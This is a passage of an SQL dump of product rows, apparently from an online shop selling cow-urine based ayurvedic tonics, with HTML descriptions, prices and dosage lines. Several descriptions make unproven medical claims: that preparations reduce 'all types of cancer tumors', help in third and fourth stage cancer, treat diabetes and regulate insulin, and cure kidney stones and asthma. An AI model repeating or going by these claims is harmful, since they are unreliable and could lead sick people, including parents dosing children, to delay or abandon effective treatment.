(74, 211, 'GGA-KA-S-008', 145, 145, 10, '<p>Helps in curing kidney and gall bladder stone problems. Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Pashanbhed, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:10:29', '2022-03-30 06:41:19', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(75, 211, 'GGA-KA-N-008', 130, 130, 10, '<p>Helps in curing kidney and gall bladder stone problems. Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Pashanbhed, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:10:29', '2022-03-30 06:41:19', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(76, 212, 'GGA-KA-G-009', 200, 200, 10, '<p>Suitable to control sugar levels. Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Saptharangi, Fennel Seeds, Cumin&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:18:25', '2022-03-30 06:40:04', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the&nbsp;ayurvedic doctor.</p>\r\n', '', ''),
(77, 212, 'GGA-KA-S-009', 170, 170, 10, '<p>Suitable to control sugar levels. Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Saptharangi, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:18:25', '2022-03-30 06:40:04', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the&nbsp;ayurvedic doctor.</p>\r\n', '', ''),
(78, 212, 'GGA-KA-N-009', 150, 150, 10, '<p>Suitable to control sugar levels. Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Saptharangi, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:18:25', '2022-03-30 06:40:04', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the&nbsp;ayurvedic doctor.</p>\r\n', '', ''),
(79, 213, 'GGA-KA-G-010', 200, 200, 10, '<p>Helps the patients in 1st phase of cancer, purifying blood without increasing or decreasing blood pressure.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Sarpgandha, Anise, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:23:15', '2022-03-30 06:39:27', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(80, 213, 'GGA-KA-S-010', 150, 150, 10, '<p>Helps the patients in 1st phase of cancer, purifying blood without increasing or decreasing blood pressure.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Sarpgandha, Anise, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:23:15', '2022-03-30 06:39:27', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(81, 213, 'GGA-KA-N-010', 140, 140, 10, '<p>Helps the patients in 1st phase of cancer, purifying blood without increasing or decreasing blood pressure.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Sarpgandha, Anise, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:23:15', '2022-03-30 06:39:27', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(82, 214, 'GGA-KA-G-011', 200, 200, 10, '<p>A complete medicine for all common gynae problems. Helps in regularizing the menstrual cycle, reducing pain, menopause.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Shatavari ark, Organic sugar, Sita Ashok, Bahrami</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:28:05', '2022-03-30 06:37:37', '<p>Dosage: Take 10 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(83, 214, 'GGA-KA-S-011', 150, 150, 10, '<p>A complete medicine for all common gynae problems. Helps in regularizing the menstrual cycle, reducing pain, menopause.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Shatavari ark, Organic sugar, Sita Ashok, Bahrami</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:28:05', '2022-03-30 06:37:37', '<p>Dosage: Take 10 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(84, 214, 'GGA-KA-N-011', 100, 100, 10, '<p>A complete medicine for all common gynae problems. Helps in regularizing the menstrual cycle, reducing pain, menopause.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Shatavari ark, Organic sugar, Sita Ashok, Bahrami</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:28:05', '2022-03-30 06:37:37', '<p>Dosage: Take 10 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(85, 215, 'GGA-KA-G-012', 250, 250, 10, '<p>A complete medicine for all common gynae problems. Helps in regularizing the menstrual cycle, reducing pain, menopause.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Shatavari Ark, Organic Sugar, Sita Ashok, Bahrami</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:32:08', '2022-03-30 06:36:30', '<p>Dosage: Take 10 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(86, 215, 'GGA-KA-S-012', 200, 200, 10, '<p>A complete medicine for all common gynae problems. Helps in regularizing the menstrual cycle, reducing pain, menopause.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Shatavari Ark, Organic Sugar, Sita Ashok, Bahrami</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:32:08', '2022-03-30 06:36:30', '<p>Dosage: Take 10 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(87, 215, 'GGA-KA-N-012', 150, 150, 10, '<p>A complete medicine for all common gynae problems. Helps in regularizing the menstrual cycle, reducing pain, menopause.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Shatavari Ark, Organic Sugar, Sita Ashok, Bahrami</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:32:08', '2022-03-30 06:36:30', '<p>Dosage: Take 10 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(88, 216, 'GGA-KA-G-013', 200, 200, 10, '<p>Helps in reducing cold, cough &amp; improves hunger in children. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Shatavari Ark, Organic Sugar</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:36:01', '2022-03-30 06:35:23', '<p>Dosage: Take 5 ml mixed with water twice a day after food or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(89, 216, 'GGA-KA-S-013', 150, 150, 10, '<p>Helps in reducing cold, cough &amp; improves hunger in children. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Shatavari Ark, Organic Sugar</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:36:01', '2022-03-30 06:35:23', '<p>Dosage: Take 5 ml mixed with water twice a day after food or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(90, 216, 'GGA-KA-N-013', 140, 140, 10, '<p>Helps in reducing cold, cough &amp; improves hunger in children. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Shatavari Ark, Organic Sugar</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:36:01', '2022-03-30 06:35:23', '<p>Dosage: Take 5 ml mixed with water twice a day after food or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(91, 217, 'GGA-KA-G-014', 200, 200, 10, '<p>Ayurvedic medicine for asthma, bronchitis, cough, allergy, breathing, and lung infections.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Jaggery, Honey, Ginger, Pippali</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:42:28', '2022-03-30 08:48:53', '<p>Dosage: Take 10 ml mixed with water twice a day after food or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(92, 217, 'GGA-KA-S-014', 150, 150, 10, '<p>Ayurvedic medicine for asthma, bronchitis, cough, allergy, breathing, and lung infections.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Jaggery, Honey, Ginger, Pippali</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:42:28', '2022-03-30 08:48:53', '<p>Dosage: Take 10 ml mixed with water twice a day after food or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(93, 217, 'GGA-KA-N-014', 140, 140, 10, '<p>Ayurvedic medicine for asthma, bronchitis, cough, allergy, breathing, and lung infections.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Jaggery, Honey, Ginger, Pippali</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:42:28', '2022-03-30 08:48:53', '<p>Dosage: Take 10 ml mixed with water twice a day after food or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(94, 218, 'GGA-KA-G-015', 400, 400, 10, '<p>Reduces all types of cancer tumors, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Kanchanaar, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:49:29', '2022-03-30 06:33:24', '<p>Dosage: Take 15 ml mixed with water on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(95, 218, 'GGA-KA-S-015', 350, 350, 10, '<p>Reduces all types of cancer tumors. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Kanchanaar, Fennel seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:49:29', '2022-03-30 06:33:24', '<p>Dosage: Take 15 ml mixed with water on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(96, 218, 'GGA-KA-N-015', 250, 250, 10, '<p>Reduces all types of cancer tumors. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Kanchanaar, Fennel seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:49:29', '2022-03-30 06:33:24', '<p>Dosage: Take 15 ml mixed with water on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(97, 219, 'GGA-KA-G-016', 150, 150, 10, '<p>Helps in arthritis, sciatica, back &amp; body aches, joint problems. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Parijaat, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:56:38', '2022-03-30 06:32:52', '<p>Dosage: Take 15 ml mixed with water on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(98, 219, 'GGA-KA-S-016', 140, 140, 10, '<p>Helps in arthritis, sciatica, back &amp; body aches, joint problems. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Parijaat, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:56:38', '2022-03-30 06:32:52', '<p>Dosage: Take 15 ml mixed with water on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(99, 219, 'GGA-KA-N-016', 130, 130, 10, '<p>Helps in arthritis, sciatica, back &amp; body aches, joint problems. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Parijaat, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:56:38', '2022-03-30 06:32:52', '<p>Dosage: Take 15 ml mixed with water on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(100, 220, 'GGA-KA-G-017', 300, 300, 10, '<p>Kashaya Amrutham ( KA) is processed with Desi Cows Gomutra. &nbsp;It is useful for cleaning of the stomach, intestines, gastric &amp; acidity problems.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nAmla, Pepper, Ajvain, Takra, Saindalavanga, Harale, Black rock salt.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 1, 0, '', '', '', '', 0, '2022-02-15 15:00:24', '2022-03-30 06:32:26', '<p>Dosage:&nbsp;Take 15 ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(101, 220, 'GGA-KA-S-017', 250, 250, 10, '<p>Kashaya Amrutham ( KA) is processed with Desi Cows Gomutra. &nbsp;It is useful for cleaning of the stomach, intestines, gastric &amp; acidity problems.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nAmla, Pepper, Ajvain, Takra, Saindalavanga, Harale, Black rock salt.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:00:24', '2022-03-30 06:32:26', '<p>Dosage:&nbsp;Take 15 ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(102, 220, 'GGA-KA-N-017', 240, 240, 10, '<p>Kashaya Amrutham ( KA) is processed with Desi Cows Gomutra. &nbsp;It is useful for cleaning of the stomach, intestines, gastric &amp; acidity problems.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nAmla, Pepper, Ajvain, Takra, Saindalavanga, Harale, Black rock salt.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:00:24', '2022-03-30 06:32:26', '<p>Dosage:&nbsp;Take 15 ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(103, 221, 'GGA-KA-G-018', 200, 200, 10, '<p>Immunity booster and acts as an anti-oxidant.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bharatiya Gomatha&rsquo;s Ksheera, Dhahi, Gritha, Gomuthra, Gomaya Rasa</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 1, 0, '', '', '', '', 0, '2022-02-15 15:04:30', '2022-03-30 06:31:05', '<p>Dosage:&nbsp;As directed by the ayurvedic doctor.</p>\r\n', '', ''),
(104, 221, 'GGA-KA-S-018', 150, 150, 10, '<p>Immunity booster and acts as an anti-oxidant.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bharatiya Gomatha&rsquo;s Ksheera, Dhahi, Gritha, Gomuthra, Gomaya rasa</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:04:30', '2022-03-30 06:31:05', '<p>Dosage:&nbsp;As directed by the ayurvedic doctor.</p>\r\n', '', ''),
(105, 221, 'GGA-KA-N-018', 130, 130, 10, '<p>Immunity booster and acts as an anti-oxidant.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bharatiya Gomatha&rsquo;s Ksheera, Dhahi, Gritha, Gomuthra, Gomaya rasa</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:04:30', '2022-03-30 06:31:05', '<p>Dosage:&nbsp;As directed by the ayurvedic doctor.</p>\r\n', '', ''),
(106, 222, 'GGA-KA-G-019', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and useful for heart related problems Gogarbha is prepared with purified cow urine and useful for heart related problems Gogarbha is prepared with purified cow urine and useful for heart related problems Gogarbha is prepared with purified cow urine and useful for heart related problems', 'Heart related problems', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:14:58', '0000-00-00 00:00:00', '', '', ''),
(107, 222, 'GGA-KA-S-019', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and useful for heart related problems', 'Heart related problems', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:14:58', '0000-00-00 00:00:00', '', '', ''),
(108, 222, 'GGA-KA-N-019', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and useful for heart related problems', 'Heart related problems', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:14:58', '0000-00-00 00:00:00', '', '', ''),
(109, 223, 'GGA-KA-G-020', 150, 150, 10, '<p>Kashaya Amrutham ( KA) is processed with Desi Cows Gomutra. Helps in 3rd &amp; 4th stage of cancer. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Desi cow goumuthram, Kanchanar, Sinarouba, other herbs.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 1, 0, '', '', '', '', 0, '2022-02-15 15:21:00', '2022-03-30 06:30:25', '<p>Dosage: Take 15ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(110, 223, 'GGA-KA-S-020', 150, 150, 10, '<p>Kashaya Amrutham ( KA) is processed with Desi Cows Gomutra. Helps in 3rd &amp; 4th stage of cancer. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Desi cow goumuthram, Kanchanar, Sinarouba, other herbs.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:21:00', '2022-03-30 06:30:25', '<p>Dosage: Take 15ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(111, 223, 'GGA-KA-N-020', 150, 150, 10, '<p>Kashaya Amrutham ( KA) is processed with Desi Cows Gomutra. Helps in 3rd &amp; 4th stage of cancer. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Desi cow goumuthram, Kanchanar, Sinarouba, other herbs.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:21:00', '2022-03-30 06:30:25', '<p>Dosage: Take 15ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(112, 224, 'GGA-KA-G-021', 200, 200, 10, '<p>Helps treat diabetes, high sugar, weight management and regulates the insulin levels. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nCow urine, Saptharangi, Fennel seeds, Cumin.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 1, 0, '', '', '', '', 0, '2022-02-15 15:25:09', '2022-03-30 06:29:56', '<p>Dosage: Take 15ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(113, 224, 'GGA-KA-S-021', 190, 190, 10, '<p>Helps treat diabetes, high sugar, weight management and regulates the insulin levels. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nCow Urine, Saptharangi, Fennel Seeds, Cumin.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 1, 0, '', '', '', '', 0, '2022-02-15 15:25:09', '2022-03-30 06:29:56', '<p>Dosage: Take 15ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(114, 224, 'GGA-KA-N-021', 150, 150, 10, '<p>Helps treat diabetes, high sugar, weight management and regulates the insulin levels. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nCow Urine, Saptharangi, Fennel Seeds, Cumin.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 15:25:09', '2022-03-30 06:29:56', '<p>Dosage: Take 15ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(115, 225, 'GGA-KA-G-022', 150, 150, 10, '<p>Helps in the 3rd &amp; 4th stages of cancer. Boosts immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine, Fennel Seeds, Cumin, Sadabahar</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '110', 1, 0, '', '', '', '', 0, '2022-02-15 15:33:56', '2022-03-30 06:29:05', '<p>Dosage: Take 15 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(116, 225, 'GGA-KA-S-022', 140, 140, 10, '<p>Helps in the 3rd &amp; 4th stages of cancer. Boosts immunity.</p>\r\n\r\n<p>Ingredients:</p>\r\n\r\n<p>Cow urine, Fennel Seeds, Cumin, Sadabahar</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '110', 0, 0, '', '', '', '', 0, '2022-02-15 15:33:56', '2022-03-30 06:29:05', '<p>Dosage: Take 15 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(117, 225, 'GGA-KA-N-022', 150, 150, 10, '<p>Helps in the 3rd &amp; 4th stages of cancer. Boosts immunity.</p>\r\n\r\n<p>Ingredients:</p>\r\n\r\n<p>Cow urine, Fennel Seeds, Cumin, Sadabahar</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '110', 1, 0, '', '', '', '', 0, '2022-02-15 15:33:56', '2022-03-30 06:29:05', '<p>Dosage: Take 15 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(118, 226, 'GGA-KA-G-023', 150, 125, 10, '<p>Helps in all types of vata and Kapha disease. It boosts your immune system. Acts as an anti-toxin and helps you detoxify your body system.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '110', 1, 0, '', '', '', '', 0, '2022-02-15 15:37:31', '2022-03-30 06:28:23', '<p>Dosage: Take 15 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(119, 226, 'GGA-KA-S-023', 150, 150, 10, '<p>Helps in all types of vata and Kapha disease. It boosts your immune system. Acts as an anti-toxin and helps you detoxify your body system.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '110', 0, 0, '', '', '', '', 0, '2022-02-15 15:37:31', '2022-03-30 06:28:23', '<p>Dosage: Take 15 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(120, 226, 'GGA-KA-N-023', 140, 140, 10, '<p>Helps in all types of vata and Kapha disease. It boosts your immune system. Acts as an anti-toxin and helps you detoxify your body system.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '110', 0, 0, '', '', '', '', 0, '2022-02-15 15:37:31', '2022-03-30 06:28:23', '<p>Dosage: Take 15 ml mixed with water twice a day, morning &amp; evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(121, 227, 'GGA-KA-G-024', 200, 170, 0, '<p>Helps in balancing the tridosh, thus diseases are prevented. It has an amazing germicidal power to kill all germs causing diseases.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Double distilled ark with Punarnava, Tulsi, Amruthaballi, Sadabahar, Ashwagantha.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '110', 0, 1, '', '', '', '', 0, '2022-02-15 15:41:56', '2022-03-30 06:27:16', '<p>Dosage: Take 15ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor</p>\r\n', '', ''),
(122, 227, 'GGA-KA-S-024', 150, 150, 10, '<p>Helps in balancing the tridosh, thus diseases are prevented. It has an amazing germicidal power to kill all germs causing diseases.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Double distilled ark with Punarnava, Tulsi, Amruthaballi, Sadabahar, Ashwagantha.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '110', 0, 0, '', '', '', '', 0, '2022-02-15 15:41:56', '2022-03-30 06:27:16', '<p>Dosage: Take 15ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor</p>\r\n', '', ''),
(123, 227, 'GGA-KA-N-024', 110, 110, 10, '<p>Helps in balancing the tridosh, thus diseases are prevented. It has an amazing germicidal power to kill all germs causing diseases.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Double distilled ark with Punarnava, Tulsi, Amruthaballi, Sadabahar, Ashwagantha.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '110', 0, 0, '', '', '', '', 0, '2022-02-15 15:41:56', '2022-03-30 06:27:16', '<p>Dosage: Take 15ml mixed with water twice a day, morning &amp; evening in empty stomach or follow as directed by the ayurvedic doctor</p>\r\n', '', ''),
